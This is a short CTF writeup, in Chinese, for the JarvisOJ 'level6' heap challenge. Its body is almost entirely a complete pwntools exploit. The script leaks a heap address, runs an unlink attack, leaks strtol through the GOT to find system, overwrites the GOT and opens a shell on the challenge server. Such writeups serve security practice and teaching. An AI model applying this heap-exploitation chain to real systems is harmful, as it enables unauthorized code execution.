---
layout:     post
title:      jarvisoj level6
author:     wooy0ung
tags: 		pwn
category:  	writeup
---


>Problem Address:  
>https://www.jarvisoj.com  
>  
>Download:  
>https://dn.jarvisoj.com/challengefiles/level6.rar.fbf2e2c84e0371082703e2753a3bc514  
>  
>Address:  
>nc pwn2.jarvisoj.com 9885  
<!-- more -->


### 0x00 exploit

level6_x64的32位版本, 分析过程在Guestbook2

#### 传送门: [Guestbook2](http://www.wooy0ung.me/writeup/2017/07/31/jarvisoj-guestbook2/)

完整的exploit如下

```
from pwn import *

Io = remote('pwn2.jarvisoj.com', 9885)
#Io = process('./freenote_x86')
bin = ELF('./freenote_x86')
libc = ELF('./libc-2.19.so')
#libc = ELF('/lib/i386-linux-gnu/libc.so.6')

def add_post(content):
	Io.sendline('2')
	Io.recvuntil('Length')
	Io.sendline(str(len(content)))
	Io.recvuntil('Enter')
	Io.send(content)
def edit_post(idx,content):
	Io.sendline('3')
	Io.recvuntil('number')
	Io.sendline(str(idx))
	Io.recvuntil('Length')
	Io.sendline(str(len(content)))
	Io.recvuntil('Enter')
	Io.send(content)
def del_post(idx):
	Io.sendline('4')
	Io.recvuntil('number')
	Io.sendline(str(idx))
def get_post(content):
  	Io.recvuntil('Your choice: ')
  	Io.sendline('1')
  	Io.recvuntil(content)
  	return Io.recvuntil('\n')

#-----------------init-------------------
for i in range(4):
	add_post('a')

del_post(0)
del_post(2)

add_post('1234')

#--------------leak heap_base-------------
leak_data = get_post('1234')
heap_addr = u32(leak_data[:-1].ljust(0x4,'\x00'))
heap_base = heap_addr - 0xd28
chunk_addr = heap_base + 0x18
success("heap_base: "+hex(heap_base))

del_post(0)
del_post(1)
del_post(3)

#-----------------unlink------------------
size0 = 0x80+0x88+0x88
add_post(p32(0)+p32(size0+1)+p32(chunk_addr-0xc)+p32(chunk_addr-0x8))
add_post("/bin/sh\x00")
add_post("a"*0x80+p32(size0)+p32(0x88)+"a"*0x80+(p32(0)+p32(0x89)+"a"*0x80)*2)
del_post(3)

#------------leak system_addr-------------
strtol_got = bin.got['strtol']

edit_post(0, p32(1)+p32(1)+p32(4)+p32(strtol_got))
leak_data = get_post('0. ')
strtol_addr = u32(leak_data[:-1].ljust(0x4,'\x00'))
system_addr = strtol_addr - libc.symbols['strtol'] + libc.symbols['system']
success("strtol: "+hex(strtol_addr))
success("system: "+hex(system_addr))

#-------------------pwn--------------------
edit_post(0, p32(system_addr))
Io.sendline("$0")
Io.interactive()
```

getshell

![](/assets/img/writeup/pwn/2017-08-03-jarvisoj-level6/0x00.png)